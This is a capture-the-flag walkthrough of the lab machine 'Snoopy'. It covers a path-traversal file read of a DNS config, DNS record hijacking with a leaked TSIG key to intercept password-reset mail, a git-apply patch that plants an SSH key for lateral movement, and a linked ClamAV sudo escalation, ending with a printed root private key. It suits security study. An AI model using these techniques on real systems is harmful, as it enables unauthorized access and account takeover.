## Snoopy


```
Nmap scan report for snoopy.htb (10.129.85.155)
Host is up (0.056s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)
|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)
53/tcp    open     domain    ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp    open     http      nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
1103/tcp  filtered xaudio
4678/tcp  filtered traversal
43668/tcp filtered unknown
46816/tcp filtered unknown
52961/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Snoppy scan reveals only 22 53 80 as open ports



in the bootstrap website there's an interesting hidden function whichi is GET /download that point on a .zip archive


in the .zip are present a pdf 



Charles Schultz CEO


cschultz@snoopy.htb

sbrown@snoopy.htb  (video!)


hangel@snoopy.htb
lpelt@snoopy.htb

pr@snoopy.htb





found a subdomain with mattermost service

http://mm.snoopy.htb




## Arbitrary File Read trought zip download


in snoopy.htb there's a download?file=announcement.pdf 

```
http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//etc/bind/named.conf
```



as we can see [here](https://bind9.readthedocs.io/en/v9.18.14/reference.html) we can find the secret of dns server for update 



so we can try point mail.snoopy.htb to our address in order to recieve email reset_token!



we can do it with nsupdate




```
export HMAC='hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA='

nsupdate -y $HMAC

> server 10.10.11.212
> update add mail.snoopy.htb. 900 IN A 10.10.14.233
> show
> send

```

now in mm.snoopy.htb/reset_password 


reset password for one employee.. tried with sbrown and cbrown





## SSH_MITM

In mattermost we can select an interesting function /server_provision 

and select LINUX 2222/tcp


found this creds cb**** : sn00*********ial!!!



`ssh cbrown@snoopy.htb`



## Privesc


sudo -l reveals


```
[sudo] password for cbrown: 
Matching Defaults entries for cbrown on snoopy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git apply *
```



so we can try add things in sbrown directory ... and the only nice thing is to trying write my ssh pubkey in `/home/sbrown/.ssh/authorized_keys`

#### .patch
```
diff --git a/cbrown/.bash_history b/cbrown/.bash_history
deleted file mode 120000
index dc1dc0c..0000000
--- a/cbrown/.bash_history
+++ /dev/null
@@ -1 +0,0 @@
-/dev/null
\ No newline at end of file
diff --git a/sbrown/.ssh/authorized_keys b/sbrown/.ssh/authorized_keys
new file mode 100644
index 0000000..e69de29
--- /dev/null
+++ b/sbrown/.ssh/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa AAAAAAAAAAAAAAAzaC1..................MOHycJSTWM/pHlUsG...cDfhYojnjivCpzicSpLq
```


## User flag

so ssh sbrown@snoopy.htb



## ROOT



sudo -l shows clamscan 

Found this on [google](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/)
and also this [exploit](https://raw.githubusercontent.com/josemlwdf/ClamAV_Privilege_Escalation/main/root_exploit.py) on github 


##### extracted ssh root id_rsa


```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
EAAAGBANeetM1N4+5hUFLOVwxiGq7Yf4jFBeltqILFtCjxTfDH3xMc9hvQ/+IKWIyHMmrj
x0q1eH4zRjOOgIsw00CKCujMjeCvDzc2DGlZweiDBvQFbYRLtdZ2M6Kh5gX4ctHKeBGjN4
dydq+68CXtKu5WrP0uB1oDp3BNCSh9AAAAwQDZe7mYQ1hY4WoZ3G0aDJhq1gBOKV2HFPf4
9O15RLXne6qtCNxZpDjt3u7646/aN32v7UVzGV7tw4k/H8PyU819R9GcCR4wydLcB4bY4b
NQ/nYgjSvIiFRnP1AM7EiGbNhrchUelRq0RDugm4hwCy6fXt0rGy27bR+ucHi1W+njba6e
SN/sjHa19HkZJeLcyGmU34/ESyN6HqFLOXfyGjqTldwVVutrE/Mvkm3ii/0GqDkqW3PwgW
atU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```


```
chmod 600 id_rsa 
ssh -i id_rsa root@snoopy.htb
```










